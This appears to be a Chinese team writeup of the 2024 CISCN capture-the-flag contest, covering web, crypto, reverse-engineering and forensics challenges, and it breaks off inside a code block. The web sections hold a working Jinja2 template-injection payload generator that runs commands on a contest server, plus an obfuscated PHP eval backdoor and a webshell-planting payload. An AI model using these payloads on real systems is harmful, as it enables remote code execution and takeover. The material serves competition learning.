---
title: "2024CISCN Writeup(最好の一叉树使用者)"
description: "2024 CISCN Team WriteUp"
pubDate: "2024-12-15T19:49:19+08:00"
draft: false
---

# **Write UP最好的一叉树使用者**

## **WEB Safe_Proxy** By Ron

SSTI题，脚本一把梭

```python
#  条件：可设置 session
#  用到的字符 {{}} [] () |  select string lipsum session
def payload1():
    g = "(()|select|string)[1]"
    e = "(()|select|string)[2]"
    n = "(()|select|string)[3]"
    r = "(()|select|string)[5]"
    a = "(()|select|string)[6]"
    t = "(()|select|string)[7]"
    o = "(()|select|string)[8]"

    _global_ = "session[%s]"%g
    _builtins_ = "session[%s]" % e
    _import_ = "session[%s]" % n
    os = "session[%s]" % r
    popen = "session[%s]" % a
    cmd = "session[%s]"%t
    read = "session[%s]" % o

    session['g'] = "__globals__"
    session['e'] = "__builtins__"
    session['n'] = "__import__"
    session['r'] = "os"
    session['a'] = "popen"
    session['t'] = "whoami"
    session['o'] = "read"

    # lipsum 和 url_for 可互换
    s = "{{(lipsum[%s][%s][%s](%s)[%s](%s)|attr(%s))()}}"%(_global_,_builtins_,_import_,os,popen,cmd,read)

    print(s)

def generate_number(num:int):

    num_map = {
        0:'([]|length)',
        1:'([g]|length)',
        5:'(()|select|string|wordcount)',
        6:'(()|select|string|urlencode|wordcount)',
        12:'([g,g,g]|wordcount)',
        16:'([g,g,g,g]|wordcount)',
        20:'([g,g,g,g,g]|wordcount)',
        24:'([g,g,g,g,g,g]|wordcount)',
        28:'([g,g,g,g,g,g,g]|wordcount)',
        32:'([g,g,g,g,g,g,g,g]|wordcount)',
        36:'([g,g,g,g,g,g,g,g,g]|wordcount)',
        40:'([g,g,g,g,g,g,g,g,g,g]|wordcount)',
        44:'([g,g,g,g,g,g,g,g,g,g,g]|wordcount)',
        48:'([g,g,g,g,g,g,g,g,g,g,g,g]|wordcount)',
        106:'([config,config]|wordcount)',
    }

    keys = sorted(num_map.keys(),reverse=True)

    r = []
    for i in keys:
        while num >= i:
            num -= i 
            r.append(num_map[i])

    final_number = f"(([{','.join(r)}])|sum)"

    return final_number

def use_c(target):

    # format_c = '(()|select|string|urlencode)[0]~(()|select|string)[15]' # %c
    
    # format_c = '(()|select|string|urlencode)|attr(\'__getitem__\')(0)~(()|select|string)|attr(\'__getitem__\')(15)'

    # 在每个payload开头加上: {% set c = (()|select|string|urlencode)[0]~(()|select|string)[15] %}
    # 则format_c 可以这样写: format_c = 'c'

    format_c = '((()|select|string|urlencode)[0]~(()|select|string)[15])'
    format_s = ('%s~'*len(target))[:-1] # %s~%s~%s~%s~ ....

    
    if False: # 不使用波浪线
        # 用join 替代波浪线
        format_c = '[(()|select|string|urlencode)[0],(()|select|string)[15]]|join'
        format_s = '['+(','.join(['%s' for i in range(len(target))])) + ']|join'

        if True: # 不使用数字
            format_c = f'[(()|select|string|urlencode)[{generate_number(0)}],(()|select|string)[{generate_number(15)}]]|join'
            format_s = '['+(','.join(['%s' for i in range(len(target))])) + ']|join'

    format_tuple = (format_c,)*len(target)

    _class_ascii = ','.join([str(ord(c)) for c in target])

    # _class_ascii = ','.join([generate_number(ord(c)) for c in target])

    format_tuple+= (_class_ascii,)

    # |format() 和 % 可以平替
    result = f'(({format_s})|format(%s))'
    # result = f'(({format_s})%%(%s))'
    

    result = result%format_tuple
    return result

def str2chr(string):
    r = ''
    for c in string:
        r += f'chr({ord(c)})+'
    return r[:-1] 

def str2ascii(string):
    r = ''
    for c in string:
        r += f'{ord(c)},'
    return r[:-1] 

def payload2(cmd):
    # v1 不使用引号
    # 使用字符：{{ [] () ~ | attr select string urlencode format lipsum
    # payload = '{{((lipsum[%s][%s][%s](%s))|attr(%s)(%s))|attr(%s)()}}' % (use_c('__globals__'),use_c('__builtins__'),use_c('__import__'),use_c('os'),use_c('popen'),use_c('whoami'),use_c('read'))
    
    # v2 不使用 []
    # 使用字符：{{ ' () ~ | attr select string urlencode format lipsum 
    # 使用时候把 use_c 的 format_c 改一下

    # lipsum,url_for,get_flashed_messages 可互换
    payload = '{{get_flashed_messages|attr(%s)|attr(%s)(%s)|attr(%s)(%s)(%s)|attr(%s)(%s)|attr(%s)()}}'%(use_c('__globals__'),use_c('get'),use_c('__builtins__'),use_c('get'),use_c('__import__'),use_c('os'),use_c('popen'),use_c(cmd),use_c('read'))
    
    return payload

import requests

url = 'http://39.105.45.179:30722/'

requests.post(url=url,data={'code':payload2('mkdir /app/static')})
requests.post(url=url,data={'code':payload2('cat /flag > /app/static/flag.html')})

```

## **WEB hello_web** By Ron

连接容器，发现自动跳转到`index.php?file=hello.php`

`?file`字样猜测是文件包含

看主页源代码发现`../tips.php`和`../hackme.php`，`?file`过滤了`data`,`http`,`php://`

主页回报的头中发现tip: `&#105;&#110;&#99;&#108;&#117;&#100;&#101;&#46;&#112;&#104;&#112`，解码发现是`include.php`

尝试`file:///var/log/nginx/access.log`包含日志，打不通

`../`和`/`后跟`tips.php`和`hackme.php`都说不是这里，猜测过滤了`../`，被消除了，所以进行双写绕过(`....//`)

`....//tips.php`下是`phpinfo`，`....//hackme.php`下是

```php
<?php
highlight_file(__FILE__);
$lJbGIY="eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME";$OlWYMv="zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel";$lapUCm=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$YwzIst=$lapUCm{3}.$lapUCm{6}.$lapUCm{33}.$lapUCm{30};$OxirhK=$lapUCm{33}.$lapUCm{10}.$lapUCm{24}.$lapUCm{10}.$lapUCm{24};$YpAUWC=$OxirhK{0}.$lapUCm{18}.$lapUCm{3}.$OxirhK{0}.$OxirhK{1}.$lapUCm{24};$rVkKjU=$lapUCm{7}.$lapUCm{13};$YwzIst.=$lapUCm{22}.$lapUCm{36}.$lapUCm{29}.$lapUCm{26}.$lapUCm{30}.$lapUCm{32}.$lapUCm{35}.$lapUCm{26}.$lapUCm{30};
eval($YwzIst("JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw=="));
?>
```

```php
<?php
highlight_file(__FILE__);
$lJbGIY="eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME";$OlWYMv="zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel";$lapUCm=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$YwzIst=$lapUCm{3}.$lapUCm{6}.$lapUCm{33}.$lapUCm{30};$OxirhK=$lapUCm{33}.$lapUCm{10}.$lapUCm{24}.$lapUCm{10}.$lapUCm{24};$YpAUWC=$OxirhK{0}.$lapUCm{18}.$lapUCm{3}.$OxirhK{0}.$OxirhK{1}.$lapUCm{24};$rVkKjU=$lapUCm{7}.$lapUCm{13};$YwzIst.=$lapUCm{22}.$lapUCm{36}.$lapUCm{29}.$lapUCm{26}.$lapUCm{30}.$lapUCm{32}.$lapUCm{35}.$lapUCm{26}.$lapUCm{30};
eval($YwzIst("JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw=="));
?>
```

![](/images/ciscn-2024-writeup/001.png)

`<?php @eval($_POST['cmd_66.99']); ?>`

参数名应该是`cmd[66.99`，php中第一个`[`会被当作非法字符替换成`_`。

写个shell，`cmd[66.99=file_put_contents('shell.php','<?php @eval($_POST[1]);?>');`，再使用蚁剑连接

![](/images/ciscn-2024-writeup/002.png)

![](/images/ciscn-2024-writeup/003.png)

发现无法执行命令，使用蚁剑插件绕过禁用的函数

> 参考文献：https://blog.csdn.net/qq_62987084/article/details/142058918

![](/images/ciscn-2024-writeup/004.png)

修改蚁剑连接

![](/images/ciscn-2024-writeup/005.png)

执行成功

![](/images/ciscn-2024-writeup/006.png)

`find / -name "*flag*" 2> /dev/null`

![](/images/ciscn-2024-writeup/007.png)

成功cat flag

## **Crypto rasnd** By Ron

使用脚本连接靶机，爆破得到flag1，flag2需要使用

```python
from pwn import *
from Crypto.Util.number import *
import math

# Config
LOCAL = False
remote_addr = 'IP_ADDRESS' # CHANGEME
remote_port = 65535 # CHANGEME
context.log_level='INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARNING']

e = 65537

def get_Process():
  if LOCAL:
    p = process(file)
  else:
    p = remote(remote_addr ,remote_port)
  return p

def decrypt1(n: int, c: int, hint1: int, hint2: int):
   for i in range(2**11):
      for j in range(2**11):
          R = GCD(hint1*i - hint2*j,n)
          if 1 < R and R < n:
              q = GCD(hint1*i - hint2*j,n)
              print(q)
              p = n//q
              d = inverse(e,(p-1)*(q-1))
              m = pow(c,d,n)
              return(long_to_bytes(m).decode())
          
def decrypt2(n: int, c: int, hint: int):

  b = pow(hint, -1, n)
  c_quadratic = -514 * n

  delta = b * b - 4 * 114 * c_quadratic

  sqrt_delta = int(math.isqrt(delta))

  q = (-b + sqrt_delta) // (2 * 114)

  if n % q != 0:
      q = (-b - sqrt_delta) // (2 * 114)

  p = n // q

  phi = (p - 1) * (q - 1)
  d = pow(e, -1, phi)

  m = pow(c, d, n)
  return long_to_bytes(m).decode()

def exp():
  p = get_Process()

  # Real Start of EXP

  # 接收=========
  p.recvuntil(b'\n')

  # Crypto1
  c1n = int(p.recvuntil(b'\n').decode())
  c1c = int(p.recvuntil(b'\n').decode())
  c1hint1 = int(p.recvuntil(b'\n').decode()) + 0x114
  c1hint2 = int(p.recvuntil(b'\n').decode()) + 0x514
  print(f'[*] c1n={c1n}')
  print(f'[*] c1c={c1c}')
  print(f'[*] c1hint1={c1hint1}')
  print(f'[*] c1hint2={c1hint2}')

  # 接收=========
  p.recvuntil(b'\n')

  # Crypto2
  c2n = int(p.recvuntil(b'\n').decode())
  c2c = int(p.recvuntil(b'\n').decode())
  c2hint = int(p.recvuntil(b'\n').decode())
  print(f'[*] c2n={c2n}')
  print(f'[*] c2c={c2c}')
  print(f'[*] c2hint={c2hint}')

  p.close()

  # 接收数据完成

  flag = decrypt1(c1n, c1c, c1hint1, c1hint2)
  print('[+] Flag1 Decrypted!')
  flag += decrypt2(c2n, c2c, c2hint)
  print('[+] Flag2 Decrypted!')
  print(flag)

if __name__ == '__main__':
  exp()
```

## **Reverse ezCsky** By Jeremiah

![](/images/ciscn-2024-writeup/008.png)

Ghidra打开可以看到函数的导出表有rc4加密和swap和xor的字样

![](/images/ciscn-2024-writeup/009.png)

在010中可以看到有testkey，猜测为rc4的密钥，在`0xAA0`位置有42字节的密文数据提取出来并进行rc4解密可以得到hex数据`0a0d061c1f545653575100031d14585603191c0054034b14580702494c020701510c0800010003004f7d`

![](/images/ciscn-2024-writeup/010.png)

猜测xor部分是以第一个字节为准与下一位异或得到明文，最后把字符串反转后得到flag，exp如下

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char *hex_cipher = "0a0d061c1f545653575100031d14585603191c0054034b14580702494c020701510c0800010003004f7d";

int main(void) {
    size_t hex_len = strlen(hex_cipher);
    size_t enc_len = hex_len / 2;
    unsigned char *encrypted = malloc(enc_len);
    for (size_t i = 0; i < enc_len; i++) {
        unsigned int val;
        sscanf(hex_cipher + 2*i, "%2x", &val);
        encrypted[i] = (unsigned char)val;
    }
    unsigned char *decrypted = calloc(enc_len + 1, 1);
    for (size_t i = 0; i < enc_len; i++) {
        unsigned char c = encrypted[enc_len - 1 - i];  
        decrypted[i+1] = decrypted[i] ^ c;
    }
    for (size_t i = 0; i < (enc_len+1)/2; i++) {
        unsigned char temp = decrypted[i];
        decrypted[i] = decrypted[enc_len - i];
        decrypted[enc_len - i] = temp;
    }
    ssize_t final_len = enc_len;  
    while (final_len >= 0 && decrypted[final_len] == 0) {
        final_len--;
    }
    final_len++;
    decrypted[final_len] = '\0';
    printf("%s\n", decrypted);
    free(encrypted);
    free(decrypted);
    return 0;
}
//flag{d0f5b330-9a74-11ef-9afd-acde48001122}

```

## **Reverse dump**

运行题目给的程序发现任意更改一个字符不会导致后面的输出产生问题

![](/images/ciscn-2024-writeup/011.png)

并且尝试输入`flag{`发现跟题目给的内容前几位一致

![](/images/ciscn-2024-writeup/012.png)

推测为自定义字符表，所以可以爆破，爆破得到结果为`flag{MTczMDc4MzQ2Ng==}`

## **Forensic zeroshell_1**

在Packet 11029的http请求的Referer发现疑似Base64编码内容

`ZmxhZ3s2QzJFMzhEQS1EOEU0LThEODQtNEE0Ri1FMkFCRDA3QTFGM0F9`

![](/images/ciscn-2024-writeup/013.png)

解码后得到flag为`flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}`

![](/images/ciscn-2024-writeup/014.png)

## **Forensic zeroshell_2**

因为给了虚拟机，直接用Diskgenius挂载磁盘

![](/images/ciscn-2024-writeup/015.png)

发现四个分区，经过寻找后在第四个分区`PROFILES/\_DB.001`里面找到flag文件，内容为`c6045425-6e6e-41d0-be09-95682a4f65c4`，所以flag为`flag{c6045425-6e6e-41d0-be09-95682a4f65c4}`

## **Forensic zeroshell_3**

在找第二题的时候，同级目录下发现用`.nginx`文件且大小异常（816.4KB)，纯文本打开发现ELF头

丢进IDA，在`sub_804D9A4`函数中发现IP地址`202.115.89.103`，所以结果为`flag{202.115.89.103}`

![](/images/ciscn-2024-writeup/016.png)

## **Forensic zeroshell_4**

随着上一题，因为`.nginx`大小异常且带有`ELF`头，所以答案是`flag{.nginx}`

## **Forensic zeroshell_5**

在IDA中，按下<kbd>Shift</kbd> + <kbd>F12</kbd>，在上面IP地址的正下方发现意义不明的字符串`11223344qweasdzxc`，推测为密码，提交正确

![](/images/ciscn-2024-writeup/017.png)

## **Forensic WinFT_1**

打开题目提供的虚拟机，使用桌面提供的`Currport.exe`，发现可疑程序`flvupdate.exe`

![](/images/ciscn-2024-writeup/018.png)

进一步查看发现远端域名为`miscsecure.com`，IP地址为`192.168.116.130`，端口为`443`，所以flag为`flag{miscsecure.com:192.168.116.130:443}`

## **Forensic WinFT_2**

计划任务程序发现可以计划`Driverupdates`，点入发现描述内有内容

`f^l^a^g^:JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=`

![](/images/ciscn-2024-writeup/019.png)

冒号后面疑似Base64，放入赛博厨子，经过Base64 + HTML Entity可以得到结果为`Nice，flag is {AES_encryption_algorithm_is_an_excellent_encryption_algorithm}`，所以flag为`flag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}`

![](/images/ciscn-2024-writeup/020.png)

## **Forensic Sc05_1**

从给的Excel表格中搜索IP `134.6.4.12`，发现TCP连接比HTTP早，所以采用TCP连接的时间2024/11/09 16:22:42

![](/images/ciscn-2024-writeup/021.png)

根据题目要求，改为`2024/11/09_16:22:42`，进行MD5计算并转换为大写，最后答案为`flag{01DF5BC2388E287D4CC8F11EA4D31929}`

![](/images/ciscn-2024-writeup/022.png)

## **Forensic Kiwi**

在第33414个包发现疑似经过Base64编码的内容

`l1Mvs8wZ1LI/v3Vup1zF8bzdp1B51zz0e0xdfIXNBQMOe1wFEg+Z03ljczfC1qGdp0Y6bWnJ7rUqnQrZmVT9nFPRXqYpURBxuBKInjI5Q2xVgs56q4VRCQWbiyv00Aw7D0CKEotHSy6sQAC1x3T9wDx6xPCioqx/0nwNgrvJnF1Oq7NFZsVpnAxaZC5BVfKSEttFPjYgv3uSfmtxeJg7pPCHmJ8qf/Sd7W7n3gKSB2BELb==`

![](/images/ciscn-2024-writeup/023.png)

将题目提供的程序丢进IDA，发现函数`sub_140082974`内有加密逻辑

```c
void __fastcall sub_140082974(__int64 a1, _QWORD *a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // r13
  unsigned __int16 v5; // ax
  int v6; // ebx
  __int64 v7; // rdx
  int v8; // ecx
  _WORD *v9; // r12
  _WORD *v10; // rax
  _WORD *v11; // r14
  _WORD *v12; // rbp
  __int64 v13; // r15
  __int64 v14; // r13
  int v15; // ebp
  __int64 v16; // r9
  int v17; // r8d
  unsigned __int64 v18; // rdx
  _WORD *v19; // r10
  unsigned __int64 v20; // r11
  __int64 v21; // rbx
  __int64 v22; // rdx
  unsigned __int64 v23; // rcx
  __int16 v24; // dx
  __int16 v25; // ax
  _BYTE *v26; // rax
  _BYTE *v27; // rbx
  __int16 *v28; // rdx
  signed __int64 v29; // rax
  __int16 v30; // cx
  _WORD *v31; // rcx
  __int64 v32; // rdx
  __int16 v33; // ax
  _BYTE *v34; // rcx

  v2 = -1i64;
  v3 = a2;
  do
    ++v2;
  while ( *(_WORD *)(a1 + 2 * v2) );
  v5 = 70;
  v6 = 0;
  v7 = 0i64;
  v8 = 1;
  do
  {
    v6 = (v6 + v8 * v5) % 256;
    v5 = byte_140111152[v7++];
    ++v8;
  }
  while ( v5 );
  srand(v6);
  v9 = j__malloc_base(2i64 * (int)v2 + 2);
  v10 = j__malloc_base(2i64 * (4 * (int)v2 / 3) + 72);
  v11 = v10;
  if ( !v9 || !v10 )
    goto LABEL_36;
  if ( (int)v2 > 0 )
  {
    v12 = v9;
    v13 = a1 - (_QWORD)v9;
    v14 = (int)v2;
    do
    {
      *v12 = rand() % 128 + (v6 ^ *(_WORD *)((char *)v12 + v13));
      ++v12;
      --v14;
    }
    while ( v14 );
    v3 = a2;
  }
  v9[(int)v2] = 0;
  v15 = 0;
  if ( (int)v2 > 0 )
  {
    v16 = 0i64;
    v17 = 2;
    v18 = ((int)v2 - 1i64) / 3ui64;
    v19 = v9 + 2;
    v20 = v18 + 1;
    v15 = 4 * (v18 + 1);
    do
    {
      if ( v17 - 1 >= (int)v2 )
        v21 = 0i64;
      else
        v21 = (unsigned __int8)*(v19 - 1);
      if ( v17 >= (int)v2 )
        v22 = 0i64;
      else
        v22 = (unsigned __int8)*v19;
      v23 = v22 | ((v21 | ((unsigned __int64)(unsigned __int8)*(v19 - 2) << 8)) << 8);
      v11[v16] = word_140111070[v23 >> 18];
      v11[v16 + 1] = word_140111070[(v23 >> 12) & 0x3F];
      if ( v17 - 1 >= (int)v2 )
        v24 = 61;
      else
        v24 = word_140111070[(v23 >> 6) & 0x3F];
      v11[v16 + 2] = v24;
      if ( v17 >= (int)v2 )
        v25 = 61;
      else
        v25 = word_140111070[v23 & 0x3F];
      v11[v16 + 3] = v25;
      v17 += 3;
      v16 += 4i64;
      v19 += 3;
      --v20;
    }
    while ( v20 );
  }
  v11[v15] = 0;
  v26 = j__malloc_base(2i64 * v15 + 66);
  v27 = v26;
  if ( !v26 )
  {
LABEL_36:
    printf(L"Memory allocation failed\n");
    exit(1);
  }
  v28 = (__int16 *)&unk_140111100;
  v29 = v26 - (_BYTE *)&unk_140111100;
  do
  {
    v30 = *v28;
    *(__int16 *)((char *)v28 + v29) = *v28;
    ++v28;
  }
  while ( v30 );
  v31 = v27 - 2;
  do
    ++v31;
  while ( *v31 );
  v32 = 0i64;
  do
  {
    v33 = v11[v32];
    v31[v32++] = v33;
  }
  while ( v33 );
  v34 = v27 - 2;
  do
    v34 += 2;
  while ( *(_WORD *)v34 );
  *(_OWORD *)v34 = xmmword_140111128;
  *((_OWORD *)v34 + 1) = xmmword_140111138;
  *((_WORD *)v34 + 16) = 0;
  j__free_base(v9);
  j__free_base(v11);
  *v3 = v27;
}
```

在数据段`word_140111070`发现疑似Base64表

```asm
.rdata:0000000140111070 word_140111070  dw 64h                  ; DATA XREF: sub_140082974+18F↑r
.rdata:0000000140111070                                         ; sub_140082974+1A6↑r ...
.rdata:0000000140111072                 db  2Bh ; +
.rdata:0000000140111073                 db    0
.rdata:0000000140111074                 db  46h ; F
.rdata:0000000140111075                 db    0
.rdata:0000000140111076                 db  33h ; 3
.rdata:0000000140111077                 db    0
.rdata:0000000140111078                 db  44h ; D
.rdata:0000000140111079                 db    0
.rdata:000000014011107A                 db  77h ; w
.rdata:000000014011107B                 db    0
.rdata:000000014011107C                 db  57h ; W
.rdata:000000014011107D                 db    0
.rdata:000000014011107E                 db  6Ah ; j
.rdata:000000014011107F                 db    0
.rdata:0000000140111080                 db  38h ; 8
.rdata:0000000140111081                 db    0
.rdata:0000000140111082                 db  74h ; t
.rdata:0000000140111083                 db    0
.rdata:0000000140111084                 db  55h ; U
.rdata:0000000140111085                 db    0
.rdata:0000000140111086                 db  63h ; c
.rdata:0000000140111087                 db    0
.rdata:0000000140111088                 db  6Bh ; k
.rdata:0000000140111089                 db    0
.rdata:000000014011108A                 db  56h ; V
.rdata:000000014011108B                 db    0
.rdata:000000014011108C                 db  47h ; G
.rdata:000000014011108D                 db    0
.rdata:000000014011108E                 db  5Ah ; Z
.rdata:000000014011108F                 db    0
.rdata:0000000140111090                 db  62h ; b
.rdata:0000000140111091                 db    0
.rdata:0000000140111092                 db  35h ; 5
.rdata:0000000140111093                 db    0
.rdata:0000000140111094                 db  37h ; 7
.rdata:0000000140111095                 db    0
.rdata:0000000140111096                 db  53h ; S
.rdata:0000000140111097                 db    0
.rdata:0000000140111098                 db  31h ; 1
.rdata:0000000140111099                 db    0
.rdata:000000014011109A                 db  58h ; X
.rdata:000000014011109B                 db    0
.rdata:000000014011109C                 db  73h ; s
.rdata:000000014011109D                 db    0
.rdata:000000014011109E                 db  4Ch ; L
.rdata:000000014011109F                 db    0
.rdata:00000001401110A0                 db  71h ; q
.rdata:00000001401110A1                 db    0
.rdata:00000001401110A2                 db  66h ; f
.rdata:00000001401110A3                 db    0
.rdata:00000001401110A4                 db  6Dh ; m
.rdata:00000001401110A5                 db    0
.rdata:00000001401110A6                 db  30h ; 0
.rdata:00000001401110A7                 db    0
.rdata:00000001401110A8                 db  76h ; v
.rdata:00000001401110A9                 db    0
.rdata:00000001401110AA                 db  6Eh ; n
.rdata:00000001401110AB                 db    0
.rdata:00000001401110AC                 db  70h ; p
.rdata:00000001401110AD                 db    0
.rdata:00000001401110AE                 db  65h ; e
.rdata:00000001401110AF                 db    0
.rdata:00000001401110B0                 db  4Dh ; M
.rdata:00000001401110B1                 db    0
.rdata:00000001401110B2                 db  45h ; E
.rdata:00000001401110B3                 db    0
.rdata:00000001401110B4                 db  7Ah ; z
.rdata:00000001401110B5                 db    0
.rdata:00000001401110B6                 db  51h ; Q
.rdata:00000001401110B7                 db    0
.rdata:00000001401110B8                 db  32h ; 2
.rdata:00000001401110B9                 db    0
.rdata:00000001401110BA                 db  42h ; B
.rdata:00000001401110BB                 db    0
.rdata:00000001401110BC                 db  67h ; g
.rdata:00000001401110BD                 db    0
.rdata:00000001401110BE                 db  2Fh ; /
.rdata:00000001401110BF                 db    0
.rdata:00000001401110C0                 db  50h ; P
.rdata:00000001401110C1                 db    0
.rdata:00000001401110C2                 db  54h ; T
.rdata:00000001401110C3                 db    0
.rdata:00000001401110C4                 db  72h ; r
.rdata:00000001401110C5                 db    0
.rdata:00000001401110C6                 db  6Fh ; o
.rdata:00000001401110C7                 db    0
.rdata:00000001401110C8                 db  68h ; h
.rdata:00000001401110C9                 db    0
.rdata:00000001401110CA                 db  78h ; x
.rdata:00000001401110CB                 db    0
.rdata:00000001401110CC                 db  6Ch ; l
.rdata:00000001401110CD                 db    0
.rdata:00000001401110CE                 db  75h ; u
.rdata:00000001401110CF                 db    0
.rdata:00000001401110D0                 db  69h ; i
.rdata:00000001401110D1                 db    0
.rdata:00000001401110D2                 db  4Ah ; J
.rdata:00000001401110D3                 db    0
.rdata:00000001401110D4                 db  43h ; C
.rdata:00000001401110D5                 db    0
.rdata:00000001401110D6                 db  52h ; R
.rdata:00000001401110D7                 db    0
.rdata:00000001401110D8                 db  49h ; I
.rdata:00000001401110D9                 db    0
.rdata:00000001401110DA                 db  59h ; Y
.rdata:00000001401110DB                 db    0
.rdata:00000001401110DC                 db  41h ; A
.rdata:00000001401110DD                 db    0
.rdata:00000001401110DE                 db  79h ; y
.rdata:00000001401110DF                 db    0
.rdata:00000001401110E0                 db  48h ; H
.rdata:00000001401110E1                 db    0
.rdata:00000001401110E2                 db  36h ; 6
.rdata:00000001401110E3                 db    0
.rdata:00000001401110E4                 db  4Eh ; N
.rdata:00000001401110E5                 db    0
.rdata:00000001401110E6                 db  34h ; 4
.rdata:00000001401110E7                 db    0
.rdata:00000001401110E8                 db  61h ; a
.rdata:00000001401110E9                 db    0
.rdata:00000001401110EA                 db  4Bh ; K
.rdata:00000001401110EB                 db    0
.rdata:00000001401110EC                 db  4Fh ; O
.rdata:00000001401110ED                 db    0
.rdata:00000001401110EE                 db  39h ; 9
.rdata:00000001401110EF                 db    0
.rdata:00000001401110F0                 db    0
.rdata:00000001401110F1                 db    0
.rdata:00000001401110F2                 db    0
.rdata:00000001401110F3                 db    0
.rdata:00000001401110F4                 db    0
.rdata:00000001401110F5                 db    0
.rdata:00000001401110F6                 db    0
.rdata:00000001401110F7                 db    0
.rdata:00000001401110F8                 db    0
.rdata:00000001401110F9                 db    0
.rdata:00000001401110FA                 db    0
.rdata:00000001401110FB                 db    0
.rdata:00000001401110FC                 db    0
.rdata:00000001401110FD                 db    0
.rdata:00000001401110FE                 db    0
.rdata:00000001401110FF                 db    0
```

弄出来为`d+F3DwWj8tUckVGZb57S1XsLqfm0vnpeMEzQ2Bg/PTrohxluiJCRIYAyH6N4aKO9`

在data段把上面加密过程用到的数组弄出来，data段内容如下

```asm
.rdata:0000000140111152 byte_140111152  db 69h                  ; DATA XREF: sub_140082974:loc_1400829D9↑r
.rdata:0000000140111153                 db    0
.rdata:0000000140111154                 db  78h ; x
.rdata:0000000140111155                 db    0
.rdata:0000000140111156                 db  65h ; e
.rdata:0000000140111157                 db    0
.rdata:0000000140111158                 db  64h ; d
.rdata:0000000140111159                 db    0
.rdata:000000014011115A                 db  53h ; S
.rdata:000000014011115B                 db    0
.rdata:000000014011115C                 db  65h ; e
.rdata:000000014011115D                 db    0
.rdata:000000014011115E                 db  65h ; e
.rdata:000000014011115F                 db    0
.rdata:0000000140111160                 db  64h ; d
.rdata:0000000140111161                 db    0
.rdata:0000000140111162                 db    0
.rdata:0000000140111163                 db    0
.rdata:0000000140111164                 align 8
```

通过上面已有的信息先尝试计算`v6`，写个C的脚本

```c
#include <stdio.h>

int main()
{
    char word_140111152[] = {
        'i', 0, 'x', 0, 'e', 0, 'd', 0, 'S', 0, 'e', 0, 'e', 0, 'd', 0, 0, 0};
    unsigned short *pass_list = (unsigned short *)word_140111152;
    int v5, v6, v7, v8;
    v5 = 70;
    v8 = 1;
    v7 = 0;
    v6 = 0;
    do
    {
        printf("[DEBUG] Before calculate v6 = %d\n", v6);
        v6 = (int)(v6 + v8 * v5) % 256;
        v5 = pass_list[v7++];
        ++v8;
        printf("[DEBUG] After calculate v6 = %d\n", v6);
    } while (v5);
    printf("v6 = %d", v6);
}

```

得到`v6`为`105`

![](/images/ciscn-2024-writeup/024.png)

预先在赛博厨子完成Base64的解密，得到数据流

```python
